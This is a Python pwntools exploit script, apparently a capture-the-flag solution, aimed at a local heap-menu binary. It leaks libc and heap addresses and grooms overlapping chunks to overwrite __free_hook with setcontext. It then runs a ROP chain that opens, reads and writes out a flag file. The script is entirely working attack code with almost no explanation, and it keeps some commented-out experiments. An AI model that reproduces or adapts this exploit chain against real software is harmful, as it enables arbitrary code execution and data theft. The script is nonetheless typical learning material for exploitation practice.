from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

def add(size):
	p.sendlineafter("exit\n",str(1))
	p.sendlineafter("size:\n",str(size))
def edit(index,content):
	p.sendlineafter("exit\n",str(2))
	p.sendlineafter("index:\n",str(index))
	p.sendafter("name:\n",str(content))
def show(index):
	p.sendlineafter("exit\n",str(3))
	p.sendlineafter("index:\n",str(index))
def delete(index):
	p.sendlineafter("exit\n",str(4))
	p.sendlineafter("index:\n",str(index))

p = process("./name")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	
add(0xe8)	#0	#0x5555557570b0 - 0x5555557578f0
show(0)
main_arean_xx = u64(p.recv(6).ljust(8,'\x00'))
print "main_arean_xx:",hex(main_arean_xx)
libc_base = main_arean_xx - (0x7ffff7bb1b78-0x7ffff77ed000)
print "libc_base:",hex(libc_base)

add(0x28)	#1	#0x555555757490 - 0x555555757b40
add(0xf8)	#2
add(0xf8)	#3
add(0xf8)	#4
add(0xf8)	#5
add(0xf8)	#6
delete(1)
add(0xf8)	#6
add(0x28)	#7 protect

'''
edit(5,'b'*8)

edit(4,'c'*0xd0+p64(0x100)+p64(0x10))
delete(3)
delete(4)
add(0xe8-0x20)	#3
edit(3,'a'*0xc8)
add(0xd0)		#4

delete(7)
add(0x10)		#7
#add(0x30)		#8
#delete(7)
#delete(8)
#add(0x18)		#7

delete(5)
'''

edit(5,'c'*8)
edit(4,'b'*0xf0+p32(0x200))
delete(3)
edit(4,'b'*0xf0+p64(0x200))
delete(5)

add(0x48)	#3
add(0xf8)	#5
add(0xf8)	#8

pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202f8
pop_rdx_ret = libc_base + 0x0000000000001b92
pop_rdx_rsi_ret = libc_base + 0x00000000001151c9
leave_ret   = libc_base + 0x0000000000042361
ret         = libc_base + 0x0000000000000937
open_addr   = libc_base + libc.sym['open']
read_addr   = libc_base + libc.sym['read']
write_addr  = libc_base + libc.sym['write']
binsh_addr  = libc_base + libc.search('/bin/sh').next()
print "binsh_addr:",hex(binsh_addr)

add(0x78)
show(9)
heap_addr = u64(p.recv(6).ljust(8,'\x00'))
print "heap_addr:",hex(heap_addr)
target_addr = heap_addr - (0x5555557575b0-0x0000555555758070)
print "target_addr:",hex(target_addr)
setcontext = libc_base + libc.sym['setcontext'] + 53
print "setcontext:",hex(setcontext)
free_hook = libc_base + libc.sym['__free_hook']
print "free_hook:",hex(free_hook)
environ_addr = libc_base + libc.sym['environ']
log.info("environ_addr:"+hex(environ_addr))

edit(8,"./flag\x00")
#gdb.attach(p,"b *$rebase(0x103B)")
#raw_input()
edit(4,p64(target_addr)+p64(free_hook)[:7])
edit(8,p64(setcontext)[:7])

edit(4,'./flag\x00\x00'*20+p64(target_addr)+p64(ret))

flag_addr = heap_addr-(0x5555557575b0-0x555555757d70)

payload = p64(pop_rdi_ret) + p64(flag_addr)
payload += p64(pop_rsi_ret) + p64(0x0)
payload += p64(open_addr)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rdx_rsi_ret) + p64(0x100) + p64(heap_addr+0x440)
payload += p64(read_addr)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rdx_rsi_ret) + p64(0x100) + p64(heap_addr+0x400)
payload += p64(write_addr)
edit(1,payload)


write_addr
delete(4)

p.interactive()